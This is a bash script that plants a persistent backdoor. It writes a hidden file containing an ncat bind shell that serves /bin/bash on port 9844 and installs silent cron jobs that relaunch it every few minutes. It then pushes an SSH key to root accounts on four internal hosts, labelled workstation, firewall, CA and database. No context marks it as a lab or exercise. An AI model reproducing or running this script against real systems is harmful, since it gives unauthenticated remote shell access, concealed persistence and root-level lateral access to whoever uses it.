SCRIPT="$HOME/scripts/. "

## CREATE SCRIPT
cat << EOF > "$SCRIPT"
ncat -l 9844 -i 10 -v -e /bin/bash
EOF

## INSTALL CRON
# create cronjob to activate the script in certain intervals:
# repeats every 20 minutes, during those 20min the pattern is:
# at minute: 0, 5, 8, 11, 17, 19

echo "*/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
echo "5-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
echo "8-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
echo "11-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
echo "17-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron
echo "19-59/20 * * * * bash '$SCRIPT' > /dev/null 2>&1" >> tmpcron


# Check if cronjob already installed
if crontab -l | grep -q "$SCRIPT" ; then
	echo "Crontab for $SCRIPT already installed, skipping"
else
	echo "Installing cronjobs"
	crontab -l >> tmpcron # make sure old cronjobs are kept
	crontab < tmpcron
fi

rm -rf tmpcron



## SEND ssh key to all machine root users
# ssh target
WS_ADR=root@192.168.51.14
FW_ADR=root@192.168.50.50
CA_ADR=root@192.168.50.31
DB_ADR=root@192.168.50.33

# SSH Key file
KEY=$HOME/.ssh/id_rsa

ssh-copy-id -i $KEY $WS_ADR
ssh-copy-id -i $KEY $FW_ADR
ssh-copy-id -i $KEY $CA_ADR
ssh-copy-id -i $KEY $DB_ADR
